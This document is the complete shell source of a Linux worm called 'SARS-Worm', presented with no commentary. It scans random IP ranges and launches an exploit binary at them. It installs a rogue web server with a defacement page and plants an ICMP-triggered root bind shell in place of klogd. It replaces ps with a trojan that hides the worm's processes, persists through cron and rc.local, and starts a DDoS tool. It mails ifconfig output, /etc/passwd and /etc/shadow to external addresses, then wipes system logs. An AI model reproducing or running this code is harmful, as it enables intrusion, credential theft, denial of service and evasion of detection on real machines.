#!/bin/sh
#The SARS-Worm's main kernel.
#powered by H.L.C-Team.
export PATH=/sbin:/usr/sbin:/bin:/usr/bin:/usr/local/bin/:.
cat >getip <<__eof__
#!/bin/sh
PATH="/usr/bin:/bin:/usr/local/bin/:/usr/sbin/:/sbin"
export PATH

route -n | while read A
do

GW=\`echo \$A | awk '{printf("%s",\$1)}'\`

if [ \$GW = "0.0.0.0" ]
then

IFACE=\`echo \$A | awk '{printf("%s",\$8)}'\`

ifconfig \$IFACE | while read B
     do
      CMP=\`echo \$B | awk '{printf("%s",\$1)}'\`
      if [ \$CMP = "inet" ]
         then
         MYIP=\`echo \$B | cut -d: -f 2 | awk '{printf("%s",\$1)}'\`
        # echo "my default iface is \$IFACE and my ip is \$MYIP"
         echo \$MYIP > myip
      exit
      fi
   done

fi
done
__eof__

cat >ranip.pl <<__eof__
#!/usr/bin/perl

use Getopt::Long;

      \$addr[0] = int(rand(254)+1);
      \$addr[1] = int(rand(255));
      \$b_ip = "\$addr[0].\$addr[1]";
print \$b_ip;
__eof__

chmod 777 samd shttpd ranip.pl getip ddos
./getip

if [ -f sign0 ]; then
exit 0
fi

if [ -f /usr/lib/klogd.so ]; then
mail -s "ICMPbackdoor" hyukie54@163.com <myip
echo "hacked sign file">sign0
rm -rf myip
exit 0
fi

cat >myipb <<__eof__
#!/bin/bash
IPA=\`cut -d. -f 1 myip\`;
IPB=\`cut -d. -f 2 myip\`;
echo \$IPA"."\$IPB

__eof__

cat >start <<__eof__
rm -rf .log .log1 .log2 .log3 .log4
cp samd sama;cp samd samb;cp samd samc;cp samd same;cp samd samf
IPa=\`./ranip.pl\`
nohup ./sama -S \$IPa>>.log &
IPb=\`./ranip.pl\`
nohup ./samb -S \$IPb>>.log1 &
IPc=\`./ranip.pl\`
nohup ./samc -S \$IPc>>.log2 &
cat myip | while read IPd
do nohup ./same -S \$IPd>>.log3 &
done
./myipb | while read IPe
do nohup ./samf -S \$IPe>>.log4 &
done

__eof__

#########################SARS-Worm small http daemon#########################
cat >thttpd <<__eof__
# default: on
# Start THTTPD

service thttpd
{
   socket_type     = stream
   protocol        = tcp
   port            = 80
   user            = nobody
   wait            = no
   server          = /usr/lib/shttpd
   server_args     = /usr/lib/.lib
   disable         = no
}

__eof__

cat >index.html <<__eof__
<html>

<head>
<title>SARS!!!</title>
</head>

<body bgcolor="#000000" text="#FF0000">

<p align="center">H</p>
<p align="center">L</p>
<p align="center"><font size="6"><b>Warning!!!</b></font></p>
<p align="center">C</p>
<p align="center"><font size="7">SARS-WormZzz</font></p>

</body>

</html>
__eof__

chmod 777 myipb getip start;chmod a+r thttpd index.html
killall -9 xinetd > /dev/null 2>&1;killall -9 httpd > /dev/null 2>&1
killall -9 httpd > /dev/null 2>&1;mv thttpd /etc/xinetd.d;mv shttpd /usr/lib
/usr/sbin/xinetd 1>>/dev/null 2>>/dev/null 3>>/dev/null

#########################SARS-Worm DD.O.S Kernel##########################
cat >mkip.pl <<__eof__
#!/usr/bin/perl
srand;
for(;;){
\$ipa = int(rand(255));
\$ipb = int(rand(255));
\$ipc = int(rand(255));
  open(HD,">> hosts");

  for(\$i=1;\$i < 256;\$i++) {
   \$IP = "\$ipa.\$ipb.\$ipc.\$i\n";
   print HD \$IP;
   @f = stat("hosts");
   if(\$f[7] > 20480){exit;}
  }
 }
close(HD);
exit;

__eof__

mv 0anacron.bak /etc/cron.daily/0anacron 1>>/dev/null 2>>/dev/null
cp /etc/cron.daily/0anacron 0anacron.bak 1>>/dev/null 2>>/dev/null
echo "#!/bin/sh">/etc/cron.daily/0anacron
touch -r 0anacron.bak /etc/cron.daily/0anacron
echo "rm -rf /etc/xinetd.d/thttpd ">>/etc/cron.daily/0anacron
echo "killall -9 xinetd > /dev/null 2>&1">>/etc/cron.daily/0anacron
echo "killall -9 ddos > /dev/null 2>&1">>/etc/cron.daily/0anacron
echo "/usr/sbin/xinetd > /dev/null 2>&1">>/etc/cron.daily/0anacron
echo "cd /usr/lib/.lib">>/etc/cron.daily/0anacron
echo "./mkip.pl">>/etc/cron.daily/0anacron
echo "nohup ./ddos > /dev/null 2>&1 &">>/etc/cron.daily/0anacron
######################################################################

cat >mail.sh <<__eof__
./getip
clear
cat myip | while read ip ;
do echo "mail -s \$ip hyukie54@163.com <mail.txt" >go;
done
clear
cat myip | while read ip ;
do echo "mail -s \$ip nihao16897888@21cn.com <mail.txt" >go2;
done
chmod 755 go go2
./go
./go2

__eof__

cat >mail2.sh <<__eof__
./getip
clear
cat myip | while read ip ;
do echo "mail -s \$ip hyukie54@163.com <mail.txt" >go;
done
clear
cat myip | while read ip ;
do echo "mail -s \$ip nihao16897888@21cn.com <mail.txt" >go2;
done
chmod 755 go go2
./go
./go2

__eof__

cat >run <<__eof__
clear
cat .log .log1 .log2 .log3 .log4>>.logbak;cat .log .log1 .log2 .log3 .log4>.logfile
cat .logfile | while read ip
do echo "./samd -b 0 \$ip 1>>/dev/null 2>>/dev/null 3>>/dev/null &" >> samhack;done
chmod 777 samhack 1>>/dev/null 2>>/dev/null;./samhack 1>>/dev/null 2>>/dev/null
sleep 1000
killall -9 samd 1>>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 samhack 1>>/dev/null 2>>/dev/null 3>>/dev/null
rm -rf samhack 1>>/dev/null 2>>/dev/null
date >time
cat time | while read clock
do echo "Running......., \$clock" >>hacksign;done;rm -rf time

__eof__

cat >icmp.c <<__eof__
#include <signal.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdio.h>
#define SIZEPACK 77
#define PORT     65535
 
void child_kill()
{
  wait(NULL);
  signal(SIGCHLD, child_kill);
}
int bind_shell()
{
  int soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid;
  struct sockaddr_in serv_addr;
  struct sockaddr_in client_addr;
  setuid(0);
  setgid(0);
  seteuid(0);
  setegid(0);
  chdir("/");
  soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (soc_des == -1)
    exit(-1);
  bzero((char *) &serv_addr,sizeof(serv_addr));
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
  serv_addr.sin_port = htons(PORT);
  soc_rc = bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
 
  if (soc_rc != 0)
    exit(-1);
  if (fork() != 0)
    exit(0);
  setpgrp();
  if (fork() != 0)
    exit(0);
  soc_rc = listen(soc_des, 5);
  if (soc_rc != 0)
    exit(0);
  while (1)
    {
      soc_len = sizeof(client_addr);
      soc_cli = accept(soc_des, (struct sockaddr *) &client_addr, &soc_len);
 
      if (soc_cli < 0)
        exit(0);
      cli_pid = getpid();
      server_pid = fork();
      if (server_pid != 0)
        {
          dup2(soc_cli,0);
          dup2(soc_cli,1);
          dup2(soc_cli,2);
          execl("/bin/sh","sh",(char *)0);
          close(soc_cli);
          return 1;
        }
      close(soc_cli);
    }
}
int main(int argc, char *argv[])
{
  int s, size, fromlen;
  char pkt[4096];
  struct protoent *proto;
  struct sockaddr_in from;
 
  strcpy(argv[0], (char *)strcat(argv[0], "                             "));
 
  signal(SIGHUP,SIG_IGN);
  signal(SIGCHLD, child_kill);
  if (fork() != 0) exit(0);
  proto = getprotobyname("icmp");
  if ((s = socket(AF_INET, SOCK_RAW, proto->p_proto)) < 0)
    exit(0);
 
  while(1)
    {
      do
        {
          fromlen = sizeof(from);
          if ((size = recvfrom(s, pkt, sizeof(pkt), 0, (struct sockaddr *) &from
, &
fromlen)) < 0)
            printf("", size-28);
 
        } while (size != SIZEPACK + 28);
      switch(fork())      {
      case -1:
        continue;
      case 0:
        bind_shell();
        exit(0);
      }
      sleep(15);
    }
}
 
__eof__

cat >ps.c <<__eof__
#include <stdio.h>
#include <string.h>
 
#define PR "sars"
#define PS "/usr/bin/sars"
#define ERR "/tmp/.problem"
#define TMP "/tmp/.tmp"
#define nr 14
#define OFFSET 100
 
char *lns[nr] = {
"same",
"samf",
"cat",
"ddos",
"samd",
"sama",
"samb",
"samc",
"perl",
"sh ./",
"samhack",
"sh -c",
"sleep",
"ranip.pl",
};
 
char *s;
int i,c,k;
FILE *ep,*op;
char bufa[12024];
char bufb[12024];
char bufc[12024];
 
int check(char *b)
{
for(i=0;i<nr;i++) {
if((s=strstr(b,lns[i]))!=NULL) {
return(-1);
}
}
return(0);
}
 
 
int fixps(int z)
{
while(fgets(bufc,z+OFFSET,ep)) {
if(!(s=strstr(bufc,PS))) {
if(!(s=strstr(bufc,PR))) {
if(!(check(bufc))) {
printf("%s",bufc); }
 
}
}
}
return;
}
 
main(int argc, char *argv[])
{
 
ep=fopen(TMP,"w");
fputs("\n",ep);
if (argc>1) {
strcat(bufa,PS);
strcat(bufb,"");
for(i=1;i<argc;i++) {
strcat(bufb," ");
strcat(bufa," ");
strcat(bufb,argv[i]);
strcat(bufa,argv[i]);
}
}
if (argc<=1) {
strcat(bufa,PS);
strcat(bufb,""); }
fclose(ep);
strcat(bufa," >> ");
strcat(bufa,TMP);
system(bufa);
 
if ((ep=fopen(TMP,"r"))==NULL) {
op=fopen(ERR,"a");
fprintf(op,"\nProblem occured, trojan dumped:\n%s execved by %s
doing %s",PS,getlogin(),bufb);
fclose(op);
execv(PS,bufb);
exit(0);
}
 
while ((c=fgetc(ep))!='\n') {
k++; }
 
fixps(k);
fclose(ep);
remove(TMP);
}

__eof__

chmod 777 mail.sh mail2.sh run mkip.pl;chmod a+r icmp.c ps.c
cc -o icmp icmp.c > /dev/null 2>&1;cc -o ps ps.c > /dev/null 2>&1
cp /usr/bin/sars /bin/ps 1>>/dev/null 2>>/dev/null 3>>/dev/null
cp /usr/lib/klogd.so /usr/sbin/klogd 1>>/dev/null 2>>/dev/null 3>>/dev/null
mv /usr/lib/.lib/rc.local.bak /etc/rc.d/rc.local 1>>/dev/null 2>>/dev/null
cp /bin/ps /usr/bin/sars;cp ps /bin;touch -r /usr/bin/sars /bin/ps
cp /etc/rc.d/rc.local rc.local.bak 1>>/dev/null 2>>/dev/null
echo "killall -9 xinetd > /dev/null 2>&1">>/etc/rc.d/rc.local
echo "killall -9 httpd > /dev/null 2>&1">>/etc/rc.d/rc.local
echo "/usr/sbin/xinetd > /dev/null 2>&1">>/etc/rc.d/rc.local
echo "cd /usr/lib/.lib">>/etc/rc.d/rc.local
echo "/usr/lib/.lib/start > /dev/null 2>&1">>/etc/rc.d/rc.local
touch -r /usr/lib/.lib/rc.local.bak /etc/rc.d/rc.local
chown root.root /bin/ps /usr/bin/sars
rm -rf /usr/lib/lib/ 1>>/dev/null 2>>/dev/null 3>>/dev/null
rm -rf /dev/.lib 1>>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 samd 1>>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 sama 1>>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 samb 1>>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 samc 1>>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 same 1>>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 samf 1>>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 ddos 1>>/dev/null 2>>/dev/null 3>>/dev/null
./mkip.pl;nohup ./ddos > /dev/null 2>&1 &

if [ -d /etc/cron.hourly ]; then
echo "#!/bin/sh">/etc/cron.hourly/0anacron;chmod a+rx /etc/cron.hourly/0anacron
echo "cd /usr/lib/.lib">>/etc/cron.hourly/0anacron
echo "/usr/lib/.lib/run > /dev/null 2>&1">>/etc/cron.hourly/0anacron
killall -9 crond > /dev/null 2>&1;/usr/sbin/crond > /dev/null 2>&1
else
mkdir /etc/cron.hourly;echo "01 * * * * root run-parts /etc/cron.hourly">>/etc/crontab
echo "#!/bin/sh">/etc/cron.hourly/0anacron;chmod a+rx /etc/cron.hourly/0anacron
echo "cd /usr/lib/.lib">>/etc/cron.hourly/0anacron
echo "/usr/lib/.lib/run > /dev/null 2>&1">>/etc/cron.hourly/0anacron
killall -9 crond > /dev/null 2>&1;/usr/sbin/crond > /dev/null 2>&1
/etc/init.d/cron restart > /dev/null 2>&1;/etc/init.d/crond restart > /dev/null 2>&1;
fi

if [ -f /sbin/klogd ]; then
killall -9 klogd 1>>/dev/null 2>>/dev/null 3>>/dev/null
cp /sbin/klogd /usr/lib/klogd.so;cp icmp /sbin/klogd
touch -r /usr/lib/klogd.so /sbin/klogd;chown root.root /sbin/klogd /usr/lib/klogd.so
klogd
echo /**************************HOST IP*****************************/ >mail.txt
ifconfig >>mail.txt
echo /************************HOSTS*****************************/ >>mail.txt
cat /etc/hosts >>mail.txt
echo /************************PASSWD***************************/ >>mail.txt
cat /etc/passwd >>mail.txt
echo /************************SHADOW***************************/ >>mail.txt
cat /etc/shadow >>mail.txt
mail.sh
echo >/var/log/maillog
echo >/var/log/messages
rm -rf go* mail.txt
./start
exit 0
fi

killall -9 klogd 1>>/dev/null 2>>/dev/null 3>>/dev/null
cp /usr/sbin/klogd /usr/lib/klogd.so;cp icmp /usr/sbin/klogd
touch -r /usr/lib/klogd.so /usr/sbin/klogd;chown root.root /usr/sbin/klogd /usr/lib/klogd.so
klogd
echo /**************************HOST IP*****************************/ >mail.txt
ifconfig >>mail.txt
echo /************************HOSTS*****************************/ >>mail.txt
cat /etc/hosts >>mail.txt
echo /************************PASSWD***************************/ >>mail.txt
cat /etc/passwd >>mail.txt
echo /************************SHADOW***************************/ >>mail.txt
cat /etc/shadow >>mail.txt
mail2.sh
echo >/var/log/maillog
echo >/var/log/messages
rm -rf go* mail.txt
./start

